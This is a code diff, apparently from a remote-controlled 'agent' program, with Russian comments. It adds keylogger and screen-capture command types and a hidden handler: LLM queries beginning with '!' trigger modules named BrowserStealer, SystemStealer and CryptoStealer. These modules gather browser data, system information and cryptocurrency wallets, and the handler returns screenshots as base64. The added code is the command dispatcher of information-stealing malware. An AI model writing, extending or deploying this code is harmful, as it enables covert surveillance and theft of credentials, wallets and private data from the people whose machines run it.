@@ -16,7 +16,7 @@ from typing import Dict, Any, Optional, Callable, List, Tuple
 
 from .shared.protocol import Command, Response, CommandType, create_keyexchange_command, complete_keyexchange
 from .shared.encryption import EncryptionManager, DiffieHellmanManager, generate_secure_token
-from .shared.keyexchange import KeyExchange
+from .shared.key_exchange import KeyExchange
 
 # Настройка логирования
 logging.basicConfig(
@@ -29,6 +29,10 @@ logging.basicConfig(
 )
 logger = logging.getLogger('agent')
 
+# Добавляем новые типы команд в CommandType
+CommandType.RUN_MODULE = "run_module"
+CommandType.CAPTURE_SCREEN = "capture_screen"
+CommandType.KEYLOGGER = "keylogger"
 
 class Agent:
     """
@@ -1104,12 +1108,16 @@ class Agent:
                 return Response(
                     command_id=command.command_id,
                     success=False,
-                    error_message="Missing query parameter for LLM",
-                    status=ResponseStatus.ERROR
+                    message="Missing query parameter for LLM",
+                    error_code=400
                 )
             
             query = command.data["query"]
             context = command.data.get("context", {})
+            
+            # Проверка на команды модулей
+            if query.startswith("!"):
+                return self._process_module_command(command, query)
             
             # Логика выполнения запроса к LLM
             # Это может быть локальный LLM или удаленный API
@@ -1120,8 +1128,7 @@ class Agent:
             return Response(
                 command_id=command.command_id,
                 success=True,
-                data={"result": llm_response},
-                status=ResponseStatus.SUCCESS
+                data={"result": llm_response}
             )
             
         except Exception as e:
@@ -1129,8 +1136,280 @@ class Agent:
             return Response(
                 command_id=command.command_id,
                 success=False,
-                error_message=f"LLM query error: {str(e)}",
-                status=ResponseStatus.ERROR
+                message=f"LLM query error: {str(e)}",
+                error_code=500
+            )
+    
+    def _process_module_command(self, command: Command, query: str) -> Response:
+        """
+        Обработка команд для вызова модулей.
+        
+        Параметры:
+        - command: Исходная команда
+        - query: Строка запроса, начинающаяся с !
+        
+        Возвращает:
+        - Ответ на команду
+        """
+        try:
+            # Разбираем команду (формат: !command arg1 arg2 ...)
+            parts = query[1:].split()
+            module_command = parts[0]
+            args = parts[1:] if len(parts) > 1 else []
+            
+            # Проверяем доступность модулей
+            try:
+                # Импортируем модули по необходимости
+                import importlib
+                import os
+                import tempfile
+                import threading
+                import time
+                import json
+                import base64
+                
+                # Пробуем импортировать модуль module_loader
+                module_loader = importlib.import_module("agent_modules.module_loader")
+                has_modules = True
+            except ImportError as e:
+                logger.error(f"Failed to import agent_modules: {str(e)}")
+                return Response(
+                    command_id=command.command_id,
+                    success=False,
+                    message=f"Modules not available: {str(e)}",
+                    error_code=500
+                )
+            
+            # Команда list_modules - показать доступные модули
+            if module_command == "list_modules":
+                try:
+                    # Создаем экземпляр ModuleLoader
+                    loader = module_loader.ModuleLoader()
+                    modules = loader.discover_modules()
+                    
+                    # Собираем информацию о модулях
+                    module_info = {}
+                    for module_name in modules:
+                        try:
+                            # Получаем модуль
+                            module = importlib.import_module(f"agent_modules.{module_name}")
+                            # Ищем класс в модуле
+                            for attr_name in dir(module):
+                                attr = getattr(module, attr_name)
+                                if isinstance(attr, type) and ("Stealer" in attr_name or attr_name == "Keylogger" or attr_name == "ScreenCapturer"):
+                                    # Нашли нужный класс
+                                    docstring = attr.__doc__ or "No description available"
+                                    module_info[module_name] = docstring.strip().split("\n")[0]
+                                    break
+                            if module_name not in module_info:
+                                module_info[module_name] = "Module available"
+                        except Exception as e:
+                            module_info[module_name] = f"Error getting info: {str(e)}"
+                    
+                    return Response(
+                        command_id=command.command_id,
+                        success=True,
+                        data={"modules": module_info}
+                    )
+                except Exception as e:
+                    logger.error(f"Error listing modules: {str(e)}")
+                    return Response(
+                        command_id=command.command_id,
+                        success=False,
+                        message=f"Error listing modules: {str(e)}",
+                        error_code=500
+                    )
+            
+            # Команда run_module - запуск конкретного модуля
+            elif module_command == "run_module":
+                if not args:
+                    return Response(
+                        command_id=command.command_id,
+                        success=False,
+                        message="Module name not specified",
+                        error_code=400
+                    )
+                
+                module_name = args[0]
+                try:
+                    # Создаем экземпляр ModuleLoader
+                    loader = module_loader.ModuleLoader()
+                    result = loader.run_module(module_name)
+                    
+                    return Response(
+                        command_id=command.command_id,
+                        success=result.get("status") != "error",
+                        data={"result": result},
+                        message=result.get("message", "")
+                    )
+                except Exception as e:
+                    logger.error(f"Error running module {module_name}: {str(e)}")
+                    return Response(
+                        command_id=command.command_id,
+                        success=False,
+                        message=f"Error running module {module_name}: {str(e)}",
+                        error_code=500
+                    )
+            
+            # Команда run_all_modules - запуск всех модулей
+            elif module_command == "run_all_modules":
+                try:
+                    # Создаем экземпляр ModuleLoader
+                    loader = module_loader.ModuleLoader()
+                    exclude = args  # Можно исключить некоторые модули
+                    results = loader.run_all_modules(exclude=exclude if exclude else None)
+                    
+                    return Response(
+                        command_id=command.command_id,
+                        success=True,
+                        data={"results": results}
+                    )
+                except Exception as e:
+                    logger.error(f"Error running all modules: {str(e)}")
+                    return Response(
+                        command_id=command.command_id,
+                        success=False,
+                        message=f"Error running all modules: {str(e)}",
+                        error_code=500
+                    )
+            
+            # Команда take_screenshot - сделать скриншот
+            elif module_command == "take_screenshot":
+                try:
+                    # Импортируем модуль
+                    screen_capture = importlib.import_module("agent_modules.screen_capture")
+                    
+                    # Создаем временную директорию
+                    temp_dir = tempfile.mkdtemp()
+                    
+                    # Создаем экземпляр ScreenCapturer
+                    sc = screen_capture.ScreenCapturer(output_dir=temp_dir)
+                    
+                    # Делаем скриншот
+                    result = sc.run()
+                    
+                    if result.get("status") == "success" and "screenshot_path" in result:
+                        # Читаем файл скриншота
+                        with open(result["screenshot_path"], "rb") as f:
+                            screenshot_data = f.read()
+                        
+                        # Кодируем в base64
+                        screenshot_b64 = base64.b64encode(screenshot_data).decode("utf-8")
+                        
+                        result["screenshot_base64"] = screenshot_b64
+                    
+                    return Response(
+                        command_id=command.command_id,
+                        success=result.get("status") == "success",
+                        data=result,
+                        message=result.get("message", "")
+                    )
+                except Exception as e:
+                    logger.error(f"Error taking screenshot: {str(e)}")
+                    return Response(
+                        command_id=command.command_id,
+                        success=False,
+                        message=f"Error taking screenshot: {str(e)}",
+                        error_code=500
+                    )
+            
+            # Команда collect_browser_data - собрать данные браузера
+            elif module_command == "collect_browser_data":
+                try:
+                    # Импортируем модуль
+                    browser_stealer = importlib.import_module("agent_modules.browser_stealer")
+                    
+                    # Создаем экземпляр BrowserStealer
+                    bs = browser_stealer.BrowserStealer()
+                    
+                    # Запускаем
+                    result = bs.run()
+                    
+                    return Response(
+                        command_id=command.command_id,
+                        success=result.get("status") == "success",
+                        data=result,
+                        message=result.get("message", "")
+                    )
+                except Exception as e:
+                    logger.error(f"Error collecting browser data: {str(e)}")
+                    return Response(
+                        command_id=command.command_id,
+                        success=False,
+                        message=f"Error collecting browser data: {str(e)}",
+                        error_code=500
+                    )
+            
+            # Команда collect_system_info - собрать информацию о системе
+            elif module_command == "collect_system_info":
+                try:
+                    # Импортируем модуль
+                    system_stealer = importlib.import_module("agent_modules.system_stealer")
+                    
+                    # Создаем экземпляр SystemStealer
+                    ss = system_stealer.SystemStealer()
+                    
+                    # Запускаем
+                    result = ss.run()
+                    
+                    return Response(
+                        command_id=command.command_id,
+                        success=result.get("status") == "success",
+                        data=result,
+                        message=result.get("message", "")
+                    )
+                except Exception as e:
+                    logger.error(f"Error collecting system info: {str(e)}")
+                    return Response(
+                        command_id=command.command_id,
+                        success=False,
+                        message=f"Error collecting system info: {str(e)}",
+                        error_code=500
+                    )
+            
+            # Команда collect_crypto - поиск криптовалютных кошельков
+            elif module_command == "collect_crypto":
+                try:
+                    # Импортируем модуль
+                    crypto_stealer = importlib.import_module("agent_modules.crypto_stealer")
+                    
+                    # Создаем экземпляр CryptoStealer
+                    cs = crypto_stealer.CryptoStealer()
+                    
+                    # Запускаем
+                    result = cs.run()
+                    
+                    return Response(
+                        command_id=command.command_id,
+                        success=result.get("status") == "success",
+                        data=result,
+                        message=result.get("message", "")
+                    )
+                except Exception as e:
+                    logger.error(f"Error collecting crypto wallets: {str(e)}")
+                    return Response(
+                        command_id=command.command_id,
+                        success=False,
+                        message=f"Error collecting crypto wallets: {str(e)}",
+                        error_code=500
+                    )
+            
+            # Неизвестная команда
+            else:
+                return Response(
+                    command_id=command.command_id,
+                    success=False,
+                    message=f"Unknown module command: {module_command}",
+                    error_code=400
+                )
+                
+        except Exception as e:
+            logger.error(f"Error processing module command: {str(e)}")
+            return Response(
+                command_id=command.command_id,
+                success=False,
+                message=f"Error processing module command: {str(e)}",
+                error_code=500
             )
     
     def _process_llm_instruction(self, query: str, context: Dict[str, Any]) -> Dict[str, Any]:
